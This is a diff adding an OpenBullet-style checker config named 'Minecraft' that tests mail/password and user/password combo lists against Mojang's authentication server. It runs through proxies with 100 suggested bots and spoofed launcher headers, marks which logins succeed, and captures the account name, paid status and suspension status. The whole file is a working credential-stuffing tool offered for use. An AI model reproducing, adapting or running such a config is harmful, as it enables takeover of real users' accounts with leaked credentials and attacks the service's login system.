@@ -1,0 +1,41 @@
+[SETTINGS]
+{
+  "Name": "Minecraft",
+  "SuggestedBots": 100,
+  "LastModified": "2018-08-17T04:30:19.1466566+02:00",
+  "AdditionalInfo": "Made for Freight",
+  "Author": "Mew",
+  "Version": "1.0.0",
+  "NeedsProxies": true,
+  "OnlySocks": false,
+  "OnlySsl": false,
+  "MaxProxyUses": 0,
+  "AllowedWordlist1": "MailPass",
+  "AllowedWordlist2": "UserPass",
+  "DataRules": [],
+  "CustomInputs": [],
+  "ForceHeadless": false,
+  "AlwaysOpen": false,
+  "AlwaysQuit": false,
+  "DisableNotifications": false,
+  "CustomUserAgent": "",
+  "RandomUA": false,
+  "CustomCMDArgs": ""
+}
+[SCRIPT]
+REQUEST POST "https://authserver.mojang.com/authenticate" AutoRedirect=FALSE 
+  CONTENT "{\"agent\":{\"name\":\"Minecraft\",\"version\":1},\"username\":\"<USER>\",\"password\":\"<PASS>\",\"requestUser\":true}" 
+  CONTENTTYPE "application/json;charset=UTF-8" 
+  HEADER "Accept: application/json, text/plain, */*" 
+  HEADER "User-Agent: Minecraft Launcher/2.1.1351 (6371f5d03a) Windows (10.0; x86)" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Origin: mojang://launcher" 
+  HEADER "Host: authserver.mojang.com" 
+KEYCHECK BanOn4XX=FALSE BanOnToCheck=TRUE 
+  KEYCHAIN Failure OR 
+    KEY "Invalid credentials." 
+  KEYCHAIN Success OR 
+    KEY "{\"accessToken" 
+PARSE "<SOURCE>" LR "name\":\"" "\"" Recursive=FALSE -> CAP "Username" "" "" 
+PARSE "<SOURCE>" LR "\"paid\":" "," Recursive=FALSE -> CAP "Paid" "" "" 
+PARSE "<SOURCE>" LR "suspended\":" "," Recursive=FALSE -> CAP "Suspended" "" "" 
